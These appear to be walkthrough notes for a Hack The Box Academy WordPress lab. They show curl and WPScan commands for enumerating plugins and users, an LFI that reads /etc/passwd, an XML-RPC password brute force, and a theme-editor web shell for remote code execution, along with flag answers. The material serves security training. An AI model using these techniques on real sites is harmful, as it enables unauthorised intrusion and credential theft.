...
#### File Structure
```
user@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
...
```
user@htb[/htb]$ tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
...
#### WP-Includes
```
user@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
...
```
```
user@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
...
```
user@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
...
```
user@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
...
```
user@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
...
![plugin-deactivated3](https://academy.hackthebox.com/storage/modules/17/plugin-deactivated3.png)
...
```
![plugin-mailmasta2](https://academy.hackthebox.com/storage/modules/17/plugin-mailmasta2.png)

We can also view the directory listing using cURL and convert the HTML output to a nice readable format using `html2text`:
```
user@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
...
Answer: `flag.txt` is inside `http://157.245.33.77:30685/wp-content/plugins/mail-masta/inc/` folder.
...
![by-admin](https://academy.hackthebox.com/storage/modules/17/by-admin.png)
...
**Existing User**
```
user@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=1
...
**Non-Existing User**
```
user@htb[/htb]$ curl -s -I -X GET http://blog.inlanefreight.com/?author=100
...
```
user@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
...
```
user@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
...
Answer: XML-RPC server accepts POST requests only. For listing all the methods, you must perform the following POST request:
```
...
```
You can use Burpsuite or using cURL in the following manner:
```
user@htb[/htb]$ curl -X POST -d "<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://<TARGET_IP>:<PORT>/xmlrpc.php
```
For a very useful complete guide on `xmlrpc.php`, read the following link: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

## WPScan Overview

### Using WPScan

[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS but can also be installed manually by `gem`:
```
user@htb[/htb]$ gem install wpscan
```
...
```
user@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
...
```
![WP_lfi](https://academy.hackthebox.com/storage/modules/17/WP_lfi.png)
...
```
user@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
...
```
user@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
...
#### Theme Editor
![Theme-Editor](https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png)

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.

#### Selecting Theme
![Twenty-Seventeen](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)
...
#### RCE
```
user@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
...
The assessment will show several questions. Here we will face the trickiest ones:

Q1: Identify the WordPress version number.

A1: By visiting the target page, there is no useful version information and Wordpress folders are not in the usual paths. But inside the source page we can see:
```html
<SNIP>
...
<SNIP>
```
Let's edit `/etc/hosts` and insert the TARGET IP with `blog.inlanefreight.local`. If now you visit `http://blog.inlanefreight.local`, you will land to a different blog page where you can get all the information you need and also the default paths of the several Wordpress folders.

Q3: Submit the contents of the flag file in the directory with directory listing enabled.

A3: `http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt`

Q4: Identify the only non-admin WordPress user.

A4: Use WPScan for enumerating users or Bruteforce all authors IDs (`http://blog.inlanefreight.local/?author=<N>`). The user is not `erika`.
If you try to use APIs for enumerating users by `http://blog.inlanefreight.local/index.php?rest_route=/wp/v2/users`, you don't get the right user.

Q5: Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

A5: If you want to enumerate vulnerable plugins by WPScan, don't use `-e vp`, use `-e ap`.
You can use the WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download vulnerability:
```
http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all
```
It will download a .csv file. Open it and you get the flag.

Q7: Use the LFI to identify a system user whose name starts with the letter "f".

A7: You can use the WordPress Plugin Site Editor 1.1.1 - Local File Inclusion vulnerability:
```
...
A8: For getting a shell, for first we should try to enter inside the administration web interface. According to the Question 4, we understood that `erika` is an administrator user. Try to bruteforce its password:
```
wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http://blog.inlanefreight.com
```
When you find the password, go to "Theme Editor", select the *Twenty Seventeen* theme and edit the `404.php` file for injecting a reverse shell or a web shell as described in some previous section above.